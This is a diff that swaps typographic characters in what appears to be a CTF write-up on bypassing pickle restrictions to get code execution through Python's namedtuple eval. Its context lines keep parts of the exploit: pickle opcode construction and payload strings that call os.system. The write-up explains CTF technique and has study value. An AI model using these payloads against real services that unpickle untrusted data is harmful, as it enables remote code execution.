@@ -65,10 +65,10 @@ To inject a malicious payload into `eval`, we must bypass checks at (B) and (C) 
 
 3. **Inject payload**: Call `namedtuple("a", {payload: 0})`. Inside namedtuple:
 
-   - `list(map(str, field_names))` → `UserDict(defaultdict(str, {payload: 0}))` — a UserDict with payload as key
+   - `list(map(str, field_names))` -> `UserDict(defaultdict(str, {payload: 0}))` -- a UserDict with payload as key
    - Validation loop only sees `"a"` (due to `__radd__` trick)
-   - `tuple(map(_sys.intern, field_names))` → `(payload,)` — payload becomes the sole field name
-   - `arg_list = ', '.join(field_names)` → the payload string
+   - `tuple(map(_sys.intern, field_names))` -> `(payload,)` -- payload becomes the sole field name
+   - `arg_list = ', '.join(field_names)` -> the payload string
    - `eval(f'lambda _cls, {payload}: ...')` evaluates the default argument expression, executing the command
 
 Attack script:
@@ -105,7 +105,7 @@ p += pickle.EMPTY_DICT + pickle.TUPLE + pickle.BUILD + pickle.POP
 # Trigger __getattr__ to inject map/list into collections globals
 p += stack_global('collections', 'map'); p += pickle.POP
 p += stack_global('collections', 'list'); p += pickle.POP
-# namedtuple("a", {payload: 0}) → eval triggers RCE
+# namedtuple("a", {payload: 0}) -> eval triggers RCE
 payload = f"a = ().__class__.__base__.__subclasses__()[84]().load_module('os').system('{CMD}'): 1 #"
 p += stack_global('collections', 'namedtuple') + pickle.MARK + short_binunicode('a') + pickle.EMPTY_DICT
 p += pickle.BINUNICODE + struct.pack('<I', len(payload)) + payload.encode()
@@ -126,13 +126,13 @@ Instead of `UserDict.__radd__`, this approach manipulates `UserString` and inter
 
 2. **Replace key functions**:
 
-   - `UserString.replace` → `_check_methods` (class attribute via BUILD slotstate)
-   - `UserString.__str__` → `_type_repr`
-   - `Counter_instance.split` → `_check_methods` (instance attribute)
-   - `_check_methods.__defaults__` → `(abstractmethod,)` (so zero-arg call uses `abstractmethod` as default)
-   - `abstractmethod.__mro__` → `()` (so `getattr` on it returns empty tuple)
-   - `_sys.intern` → `abstractmethod`
-   - `_collections_abc.NotImplemented` → `Counter()` instance (so `_check_methods` returns it instead of raising)
+   - `UserString.replace` -> `_check_methods` (class attribute via BUILD slotstate)
+   - `UserString.__str__` -> `_type_repr`
+   - `Counter_instance.split` -> `_check_methods` (instance attribute)
+   - `_check_methods.__defaults__` -> `(abstractmethod,)` (so zero-arg call uses `abstractmethod` as default)
+   - `abstractmethod.__mro__` -> `()` (so `getattr` on it returns empty tuple)
+   - `_sys.intern` -> `abstractmethod`
+   - `_collections_abc.NotImplemented` -> `Counter()` instance (so `_check_methods` returns it instead of raising)
 
 3. **Prepare payload**: Set `Counter_instance.__qualname__ = [payload]` and `Counter_instance.__module__ = "builtins"`. The payload uses `[].__reduce_ex__(3)[0].__globals__["__builtins__"]` to get real builtins without hardcoded subclass indices.
 
@@ -280,13 +280,13 @@ print(r.recvall(timeout=3).decode(errors='replace'))
 
 **How it works:**
 
-The key insight: when `namedtuple` executes `_tuple_new = tuple.__new__`, `tuple` is looked up from `collections.__dict__`. If `collections.tuple` has been replaced with a custom class `XC` (via `__getattr__`), then `_tuple_new` becomes `XC.__new__` — which is set to `_check_methods`, a Python function with `__globals__`. The eval code can then access `_tuple_new.__globals__["__builtins__"]` to get real builtins.
+The key insight: when `namedtuple` executes `_tuple_new = tuple.__new__`, `tuple` is looked up from `collections.__dict__`. If `collections.tuple` has been replaced with a custom class `XC` (via `__getattr__`), then `_tuple_new` becomes `XC.__new__` -- which is set to `_check_methods`, a Python function with `__globals__`. The eval code can then access `_tuple_new.__globals__["__builtins__"]` to get real builtins.
 
 1. Set `_collections_abc.__all__` to include `"_type_repr"`, `"_check_methods"`, `"ABCMeta"`, `"tuple"`. Get `_check_methods` and `ABCMeta` via `__getattr__`.
-2. Create `XC = ABCMeta("XC", (), {"__new__": _check_methods})` — a class whose `__new__` is `_check_methods`.
-3. Set `_collections_abc.NotImplemented = [payload]` — so `_check_methods` returns the payload list when method check fails.
-4. Set `_collections_abc.tuple = XC` — injected into `collections` globals via `__getattr__`.
-5. Call `namedtuple('x', [])`. Inside namedtuple, `tuple(...)` resolves to `XC(...)`, calling `_check_methods` which returns the payload list. The payload ends up in `arg_list`. The `#` in the payload comments out the rest, leaving `lambda _cls, a: 1, _tuple_new.__globals__["__builtins__"].__import__("os").system("cmd")` — a tuple whose second element executes the command.
+2. Create `XC = ABCMeta("XC", (), {"__new__": _check_methods})` -- a class whose `__new__` is `_check_methods`.
+3. Set `_collections_abc.NotImplemented = [payload]` -- so `_check_methods` returns the payload list when method check fails.
+4. Set `_collections_abc.tuple = XC` -- injected into `collections` globals via `__getattr__`.
+5. Call `namedtuple('x', [])`. Inside namedtuple, `tuple(...)` resolves to `XC(...)`, calling `_check_methods` which returns the payload list. The payload ends up in `arg_list`. The `#` in the payload comments out the rest, leaving `lambda _cls, a: 1, _tuple_new.__globals__["__builtins__"].__import__("os").system("cmd")` -- a tuple whose second element executes the command.
 
 ```python
 #!/usr/bin/env python3
@@ -377,14 +377,14 @@ From the [NeSE team's writeup](https://nese.team/writeup/hitcon2022.pdf). The tr
 
 1. Create `ig2 = _itemgetter(2)`, `ig3 = _itemgetter(3)`. These extract specific indices from sequences.
 2. Build a `defaults` list `['', '', ['z'], [payload]]` and set `namedtuple.__kwdefaults__` so a subsequent `namedtuple('b', ['b1','b2','b3','b4'])` uses them.
-3. Create `tuple2 = namedtuple('b', ['b1','b2','b3','b4'])` — a namedtuple with 4 fields where the last 2 have defaults `['z']` and `[payload]`.
-4. Replace `collections.map` → `tuple2`, `collections.list` → `_itemgetter(2)`, `collections.tuple` → `_itemgetter(3)` via `_collections_abc.__all__`.
+3. Create `tuple2 = namedtuple('b', ['b1','b2','b3','b4'])` -- a namedtuple with 4 fields where the last 2 have defaults `['z']` and `[payload]`.
+4. Replace `collections.map` -> `tuple2`, `collections.list` -> `_itemgetter(2)`, `collections.tuple` -> `_itemgetter(3)` via `_collections_abc.__all__`.
 
 Inside `namedtuple('a', [])`:
 
-- `list(map(str, field_names))` → `_itemgetter(2)(tuple2(str, []))` → `['z']` (passes validation)
-- `tuple(map(_sys.intern, field_names))` → `_itemgetter(3)(tuple2(sys.intern, ['z']))` → `[payload]`
-- `arg_list = payload` → `lambda _cls, z=EXPLOIT:0` — eval executes the default argument
+- `list(map(str, field_names))` -> `_itemgetter(2)(tuple2(str, []))` -> `['z']` (passes validation)
+- `tuple(map(_sys.intern, field_names))` -> `_itemgetter(3)(tuple2(sys.intern, ['z']))` -> `[payload]`
+- `arg_list = payload` -> `lambda _cls, z=EXPLOIT:0` -- eval executes the default argument
 
 ```python
 #!/usr/bin/env python3
@@ -493,7 +493,7 @@ pb.p += pb.get_memo('nt') + pb.empty_dict() + pb.mark()
 pb.p += pb.short_binunicode('__kwdefaults__') + pb.binget(pb.next_memo - 1)
 pb.p += pb.dict_op() + pb.tuple2() + pb.build() + pb.pop()
 
-# namedtuple('a', []) — triggers RCE
+# namedtuple('a', []) -- triggers RCE
 pb.p += pb.get_memo('nt') + pb.mark()
 pb.p += pb.short_binunicode('a') + pb.mark() + pb.list_op()
 pb.p += pb.tuple_op() + pb.reduce() + pb.none() + pb.stop()
